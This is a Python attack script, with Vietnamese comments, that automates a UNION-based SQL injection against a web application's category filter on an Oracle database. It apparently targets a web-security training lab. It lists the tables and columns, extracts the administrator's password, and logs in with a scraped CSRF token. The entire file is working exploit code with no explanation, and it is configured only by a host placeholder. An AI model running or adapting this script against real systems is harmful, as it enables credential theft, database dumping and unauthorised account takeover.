import requests
import re
from bs4 import BeautifulSoup

host = 'YOUR_HOST'
exploit_url = f"https://{host}/filter?category="
login_url = f"https://{host}/login"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}

s = requests.Session()

def get_data(payload):
    res = s.get(exploit_url + "' " + payload, headers=headers)
    return res.text

# --- Bước 1: Tìm tên bảng ---
print("[*] Đang tìm tên bảng...")
payload_table = "UNION SELECT null, table_name FROM all_tables WHERE table_name LIKE 'USERS_%' -- -"
html_content = get_data(payload_table)
match_table = re.search(r'USERS_[a-zA-Z0-9_]+', html_content)
if match_table:
    table_name = match_table.group(0) # Sửa thành ()
    print(f"[+] Đã tìm thấy bảng: {table_name}")
else:
    print("[-] Không tồn tại bảng cần tìm")
    exit()

# --- Bước 2: Tìm tên cột ---
print("[*] Đang tìm tên cột...")
payload_column = f"UNION SELECT null, column_name FROM all_tab_columns WHERE table_name='{table_name}' -- -"
html_content = get_data(payload_column)

username_match = re.search(r'USERNAME_[a-zA-Z0-9_]+', html_content)
password_match = re.search(r'PASSWORD_[a-zA-Z0-9_]+', html_content)

if username_match and password_match:
    username_column = username_match.group(0)
    password_column = password_match.group(0)
    print(f"[+] Đã tìm thấy 2 cột: {username_column} và {password_column}")
else:
    print("[-] Không tìm thấy cột thỏa mãn")
    exit()

# --- Bước 3: Trích xuất Admin ---
print("[*] Đang trích xuất thông tin Administrator...")
payload_dump = f"UNION SELECT null, {username_column} || '~' || {password_column} FROM {table_name} -- -"
html_content = get_data(payload_dump)
admin_creds = re.search(r'administrator~([a-zA-Z0-9]+)', html_content)

if admin_creds:
    username = "administrator"
    password = admin_creds.group(1)
    print("-" * 30)
    print(f"THÀNH CÔNG! Pass: {password}")
    print("-" * 30)
else:
    print("[-] Không tìm thấy thông tin đăng nhập.")
    exit()

# --- Bước 4: Đăng nhập ---
res_get = s.get(login_url)
soup = BeautifulSoup(res_get.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']

login_data = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

print(f"[*] Đang đăng nhập...")
res_post = s.post(login_url, data=login_data, allow_redirects=True)

if "Log out" in res_post.text:
    print("THÀNH CÔNG: Bạn đã đăng nhập vào hệ thống!")
else:
    print("[-] Đăng nhập thất bại.")